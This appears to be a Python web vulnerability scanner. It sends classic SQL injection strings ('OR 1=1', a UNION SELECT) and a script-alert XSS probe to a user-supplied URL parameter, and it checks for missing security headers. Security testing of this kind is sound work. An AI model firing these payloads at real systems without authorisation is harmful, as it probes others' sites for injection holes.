import requests

# ---------- ASCII BANNER (RED) ----------
def banner():
    RED = "\033[91m"
    RESET = "\033[0m"

    banner = f"""{RED}
  #####                                                     #     #                      
 #     #  ####  ###### ##### #    #   ##   #####  ######    #     # #    # #      #    # 
 #       #    # #        #   #    #  #  #  #    # #         #     # #    # #      ##   # 
  #####  #    # #####    #   #    # #    # #    # #####     #     # #    # #      # #  # 
       # #    # #        #   # ## # ###### #####  #          #   #  #    # #      #  # # 
 #     # #    # #        #   ##  ## #    # #   #  #           # #   #    # #      #   ## 
  #####   ####  #        #   #    # #    # #    # ######       #     ####  ###### #    # 
                                                                                         
  #####                                                                                  
 #     #  ####    ##   #    # #    # ###### #####                                        
 #       #    #  #  #  ##   # ##   # #      #    #                                       
  #####  #      #    # # #  # # #  # #####  #    #                                       
       # #      ###### #  # # #  # # #      #####                                        
 #     # #    # #    # #   ## #   ## #      #   #                                        
  #####   ####  #    # #    # #    # ###### #    #                                       
{RESET}
           SOFTWARE VULNERABILITY SCANNER
        SQL Injection | XSS | Insecure Headers
        Github: https://github.com/smbaqirzaidi
"""
    print(banner)

# ---------- PAYLOADS ----------
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--"
]

XSS_PAYLOAD = "<script>alert('XSS')</script>"

SECURITY_HEADERS = [
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Strict-Transport-Security",
    "Referrer-Policy"
]

# ---------- FUNCTIONS ----------
def check_sql_injection(url, param):
    print("\n[+] Checking SQL Injection")
    for payload in SQL_PAYLOADS:
        try:
            params = {param: payload}
            r = requests.get(url, params=params, timeout=5)
            errors = ["sql", "syntax", "mysql", "postgres", "oracle"]
            if any(err in r.text.lower() for err in errors):
                print(f"[!] Possible SQL Injection detected with payload: {payload}")
                return
        except requests.exceptions.RequestException:
            print("[!] Connection error during SQL Injection test")
            return
    print("[-] No SQL Injection detected")

def check_xss(url, param):
    print("\n[+] Checking XSS")
    try:
        params = {param: XSS_PAYLOAD}
        r = requests.get(url, params=params, timeout=5)
        if XSS_PAYLOAD in r.text:
            print("[!] Possible Reflected XSS detected")
        else:
            print("[-] No XSS detected")
    except requests.exceptions.RequestException:
        print("[!] Connection error during XSS test")

def check_headers(url):
    print("\n[+] Checking Security Headers")
    try:
        r = requests.get(url, timeout=5)
        for header in SECURITY_HEADERS:
            if header not in r.headers:
                print(f"[!] Missing header: {header}")
            else:
                print(f"[✓] {header} present")
    except requests.exceptions.RequestException:
        print("[!] Connection error while checking headers")

# ---------- MAIN ----------
if __name__ == "__main__":
    banner()

    target_url = input("Enter the target URL (e.g., http://example.com/search): ").strip()
    parameter = input("Enter the parameter name (e.g., q, id, search): ").strip()

    if not target_url or not parameter:
        print("[!] URL and parameter are required")
    else:
        check_sql_injection(target_url, parameter)
        check_xss(target_url, parameter)
        check_headers(target_url)
